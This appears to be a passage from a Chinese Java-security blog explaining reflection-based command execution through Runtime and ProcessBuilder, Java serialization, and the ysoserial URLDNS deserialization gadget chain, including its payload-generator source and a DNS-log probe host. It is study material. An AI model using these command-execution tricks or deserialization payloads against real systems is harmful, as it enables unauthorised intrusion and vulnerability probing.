<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.ReflectDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectDemo8</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ReflectDemo8 reflect=<span class="keyword">new</span> <span class="title class_">ReflectDemo8</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ReflectDemo8 <span class="title function_">getInstance</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> reflect;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">ReflectDemo8</span><span class="params">()</span>&#123;&#125;;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String agrs[])</span>&#123;</span><br><span class="line">        ReflectDemo8 rf1=ReflectDemo8.getInstance();</span><br><span class="line">        ReflectDemo8 rf2=ReflectDemo8.getInstance();</span><br><span class="line">        System.out.println(rf1==rf2); <span class="comment">//true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>回到正题，既然在<code>Runtime</code>类中，<code>getRuntime</code>可以获取实例化对象。那我们直接调用不就好了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.ReflectDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectDemo9</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        clazz.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz),<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这么看有点麻烦。拆开来看。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.ReflectDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectDemo9</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        Object rt=clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz);</span><br><span class="line">        clazz.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(rt,<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过<code>forName</code>获取<code>getRuntime</code>方法并调用，获取<code>Runtime</code>实例化对象。再获取<code>exec</code>方法并调用，来达到执行命令的目的。刚看到这里的时候有些疑惑。为什么在调用<code>getRuntime</code>方法时<code>invoke(clazz)</code>但是<code>exec</code>方法需要<code>invoke(rt)</code>，一个参数是<code>Class</code>一个参数是<code>Object</code>。查看了一下<code>invoke</code>方法，发现其参数确实是Object。也没有其他的重载。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/1662608455979-bbd05d33-fed6-4144-9267-51728e80f3a5.png"
                      alt="image.png"
                ></p>
<p>后面查看<code>getRuntime</code>方法和<code>exec</code>方法，发现<code>getRuntime</code>方法是static。查阅资料并尝试后发现确实如此。<a class="link"   href="https://www.baeldung.com/java-invoke-static-method-reflection" >Gavra-invoke-static-method<i class="fas fa-external-link-alt"></i></a></p>
<p>除了使用<code>getRuntime</code>方法外。在获取Class类构造方法章节，我们提到过获取<code>private</code>构造方法的方式：<code>getDeclaredConstructors()</code>。恰巧在<code>Runtime</code>类中存在<code>private</code>构造方法。因此利用暴力反射同样可以获取<code>Runtime</code>实例化对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.ReflectDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectDemo9</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        Constructor constructor= clazz.getDeclaredConstructor();</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Runtime rt= (Runtime) constructor.newInstance();</span><br><span class="line">        clazz.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(rt,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解决了无参数构造方法私有后，再来解决不存在无参数构造方法的问题。</p>
<p>普通的有参数构造方法在上面的获取Class类构造方法中提到过了。比较难理解的是当参数为数组时该怎么处理。</p>
<p>以常用到的，可以任意命令执行的另一个类：<code>ProcessBuilder</code>为例。其具有两个重载的构造方法。</p>
<ul>
<li>ProcessBuilder(List command)</li>
<li>ProcessBuilder(String… command)</li>
</ul>
<p>第一个好理解，只要传入的参数为List即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.ReflectDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectDemo10</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Class clazz=Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        ((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>))).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>重点在于第二个。其参数为可变长参数，对于可变长参数，java在编译时会编译成数组。也就是说在java中，以下两种方法是等价的，不可重载的</p>
<ul>
<li>ProcessBuilder(String… command)</li>
<li>ProcessBuilder(String[] command)</li>
</ul>
<p>查看<code>newInstance</code>方法，我们可以看到其参数为数组。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/1662739375623-5a669727-2a5d-4443-8f28-b2b18c46671e.png"
                      alt="image.png"
                ></p>
<p>而<code>ProcessBuilder</code>的第二个构造函数参数同样也是数组。两者结合，便成为了二维数组。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.ReflectDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectDemo10</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Class clazz=Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        ((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;)).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>至于这里为什么是二维数组。我们可以这么去理解<code>Constructor</code>和<code>newInstance</code>之间的过程</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/1662996613324-95c9eac1-2137-46cb-8bdb-7b8d39adfb61.png"
                      alt="image.png"
                ></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反射基础与URLDNS</title>
    <url>/2023/06/16/Java%E5%8F%8D%E5%B0%84%E5%9F%BA%E7%A1%80%E4%B8%8EURLDNS/</url>
    <content><![CDATA[<h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><p><code>对象流：对象流指的是可以直接把一个对象以流的形式传输给其他的介质，比如硬盘</code></p>
<p>序列化：一个对象以流的形式进行传输，叫做<strong>序列化</strong>。该对象所对应的类，必须实现Serializable接口</p>
<p>反序列化：将对象流还原成对象的过程叫做<strong>反序列化</strong></p>
<p>如下代码，将对象序列化后写入硬盘。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hero</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="comment">//类的当前版本，如果有变化，比如设计新的属性后，就应该修改版本号</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> SeriaVersionUID=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">float</span> hp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">stream</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        Hero h=<span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        h.name=<span class="string">&quot;Green&quot;</span>;</span><br><span class="line">        h.hp=<span class="number">616</span>;</span><br><span class="line">        <span class="comment">//新建文件存储序列化后的信息</span></span><br><span class="line">        File file=<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;F:/Project/IdeaProjects/Serialization/Serialization/serialize.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            file.createNewFile();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//创建基础字节输出流</span></span><br><span class="line">            FileOutputStream fileOutputStream=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">            <span class="comment">//创建对象输出流</span></span><br><span class="line">            ObjectOutputStream objectOutputStream=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">            <span class="comment">//创建基础字节输入流</span></span><br><span class="line">            FileInputStream fileInputStream=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">            <span class="comment">//创建对象输入流</span></span><br><span class="line">            ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">            <span class="comment">//将序列化内容写入硬盘文件</span></span><br><span class="line">            objectOutputStream.writeObject(h);</span><br><span class="line">            <span class="comment">//序列化内容经过反序列化读出</span></span><br><span class="line">            Hero h2= (Hero) objectInputStream.readObject();</span><br><span class="line">            System.out.println(h2);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对象输出流应在对象输入流前面。否则会报错</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626205942658.png"
                      alt="image-20230626205942658"
                ></p>
<p>Java在序列化一个对象时，将会调用这个对象中的<code>writeObject</code>方法，参数类型是<code>ObjectOutputStream</code>，开发者可以将任何内容写入这个stream。 反序列化时，会调用<code>readObject</code> ，开发者也可以从中读取出前面写入的内容，并进行处理。有点类似于PHP中的魔术方法。</p>
<p>代码实例如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    Person(String name,<span class="type">int</span> age)&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream objectOutputStream)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        objectOutputStream.defaultWriteObject();</span><br><span class="line">        objectOutputStream.writeObject(<span class="string">&quot;this is a object&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream objectIntputStream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        objectIntputStream.defaultReadObject();</span><br><span class="line">        String message=(String) objectIntputStream.readObject();</span><br><span class="line">        System.out.println(message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到在执行完默认的 <code>objectOutputStream.defaultWriteObject()</code>后，又向stream中写入了字符串<code>this is a object</code>。同样反序列化后，又将其读出。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">stream</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        Person p=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Chen&quot;</span>,<span class="number">18</span>);</span><br><span class="line">        <span class="comment">//新建文件存储序列化后的信息</span></span><br><span class="line">        File file=<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;F:\\Project\\IdeaProjects\\Serialization\\Serialization\\serialize.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            file.createNewFile();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//创建基础字节输出流</span></span><br><span class="line">            FileOutputStream fileOutputStream=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">            <span class="comment">//创建对象输出流</span></span><br><span class="line">            ObjectOutputStream objectOutputStream=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">            <span class="comment">//创建基础字节输入流</span></span><br><span class="line">            <span class="comment">//将序列化内容写入硬盘文件</span></span><br><span class="line">            objectOutputStream.writeObject(p);</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line">            FileInputStream fileInputStream=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">            <span class="comment">//创建对象输入流</span></span><br><span class="line">            ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">            <span class="comment">//序列化内容经过发序列化读出</span></span><br><span class="line">            Person p2=(Person)objectInputStream.readObject();</span><br><span class="line">            System.out.println(p2);</span><br><span class="line">            objectInputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行结果如下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626210314212.png"
                      alt="image-20230626210314212"
                ></p>
<h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p><code>URLDNS</code>是ysoserial中一条利用链的名字。</p>
<ul>
<li>在java反序列化中存在一个不可绕过的工具：ysoserial。它可以让⽤户根据自己选择的利⽤链，⽣成反序列化利⽤数据，通过将这些数据发送给⽬标，从而执⾏⽤户预先定义的命令。</li>
<li>利⽤链也叫“gadget chains”，我们通常称为gadget。我们的代码一环扣一环完整运行下来便可以理解成一个链条。</li>
</ul>
<p>通常情况下利用链是可以执行任意命令的，<code>URLDNS</code>却仅仅能发送一次DNS请求。但由于其有如下优点：</p>
<ul>
<li>使用Java内置的类构造，对第三⽅库没有依赖</li>
<li>在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞</li>
</ul>
<h3 id="URLDNS成因"><a href="#URLDNS成因" class="headerlink" title="URLDNS成因"></a>URLDNS成因</h3><p>URLDNS的成因主要是 <code>java.net.URL</code>类在进行<code>equals</code>和<code>hashcode</code>时，会调用<code>java.net.InetAdderss</code>类的<code>getByName</code>方法进行dns查询。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">urldns</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        URL a=<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://0yyeip.dnslog.cn&quot;</span>);</span><br><span class="line">        URL b=<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://0yyeip.dnslog.cn&quot;</span>);</span><br><span class="line">        a.equals(b);</span><br><span class="line">        URL c=<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://0yyeip.dnslog.cn&quot;</span>);</span><br><span class="line">        c.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626210429945.png"
                      alt="image-20230626210429945"
                ></p>
<h4 id="equals"><a href="#equals" class="headerlink" title="equals"></a>equals</h4><p>在<code>equals</code>处下断点，简单跟一下流程。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626210510048.png"
                      alt="image-20230626210510048"
                ></p>
<p>当调用<code>equals</code>时，实际上是调用<code>URLStreamHandler</code>的<code>equals</code>方法，跟入：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626210547110.png"
                      alt="image-20230626210547110"
                ></p>
<p>可以看到返回一个逻辑与的判断，当为1时<code>equals</code>成立。在这里逻辑判断的结果取决于<code>sameFile()</code>方法，跟入：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626210608423.png"
                      alt="image-20230626210608423"
                ></p>
<p>400行-415行分别是对u1和u2两个URL对象的属性进行了对比。</p>
<p>Java官方文档写道：如果<strong>两个主机名都可以解析为相同的IP地址</strong>，则认为两个主机是等效的</p>
<p><a class="link"   href="https://docs.oracle.com/javase/7/docs/api/java/net/URL.html#equals(java.lang.Object)" >https://docs.oracle.com/javase/7/docs/api/java/net/URL.html#equals(java.lang.Object)<i class="fas fa-external-link-alt"></i></a></p>
<p>因此，在418行<code>hostsEqual</code>针对两个地址解析<code>hosts</code>进行比较。跟入：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626210652472.png"
                      alt="image-20230626210652472"
                ></p>
<p>在这里执行了<code>getHostAddress</code>方法，该方法便是通过调用<code>java.net.InetAdderss</code>类的<code>getByName</code>方法发起dns请求来获取URL对应的ip地址。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626210711152.png"
                      alt="image-20230626210711152"
                ></p>
<p>看一下<code>InetAddres.getByName</code>:</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626210731474.png"
                      alt="image-20230626210731474"
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626210754338.png"
                      alt="image-20230626210754338"
                ></p>
<h4 id="hashcode"><a href="#hashcode" class="headerlink" title="hashcode"></a>hashcode</h4><p><code>hashcode</code>处下断点</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626210820921.png"
                      alt="image-20230626210820921"
                ></p>
<p>发现调用的是<code>URLStreamHandler</code>的<code>hashcode</code>方法。跟入：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230626210835120.png"
                      alt="image-20230626210835120"
                ></p>
<p>发现在359行处调用了<code>getHostAddress</code>方法，再通过调用<code>java.net.InetAdderss</code>类的<code>getByName</code>方法发起dns请求来获取URL对应的ip地址。</p>
<h3 id="URLDNS分析"><a href="#URLDNS分析" class="headerlink" title="URLDNS分析"></a>URLDNS分析</h3><p>首先看看<code>URLDNS</code>是如何生成的</p>
<p><a class="link"   href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java" >https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A blog post with more details about this gadget chain is at the url below:</span></span><br><span class="line"><span class="comment"> *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   This was inspired by  Philippe Arteau <span class="doctag">@h</span>3xstream, who wrote a blog</span></span><br><span class="line"><span class="comment"> *   posting describing how he modified the Java Commons Collections gadget</span></span><br><span class="line"><span class="comment"> *   in ysoserial to open a URL. This takes the same idea, but eliminates</span></span><br><span class="line"><span class="comment"> *   the dependency on Commons Collections and does a DNS lookup with just</span></span><br><span class="line"><span class="comment"> *   standard JDK classes.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The Java URL class has an interesting property on its equals and</span></span><br><span class="line"><span class="comment"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span></span><br><span class="line"><span class="comment"> *   during a comparison (either equals or hashCode).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   As part of deserialization, HashMap calls hashCode on each key that it</span></span><br><span class="line"><span class="comment"> *   deserializes, so using a Java URL object as a serialized key allows</span></span><br><span class="line"><span class="comment"> *   it to trigger a DNS lookup.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   Gadget Chain:</span></span><br><span class="line"><span class="comment"> *     HashMap.readObject()</span></span><br><span class="line"><span class="comment"> *       HashMap.putVal()</span></span><br><span class="line"><span class="comment"> *         HashMap.hash()</span></span><br><span class="line"><span class="comment"> *           URL.hashCode()</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line"><span class="meta">@PayloadTest(skip = &quot;true&quot;)</span></span><br><span class="line"><span class="meta">@Dependencies()</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.GEBL &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> 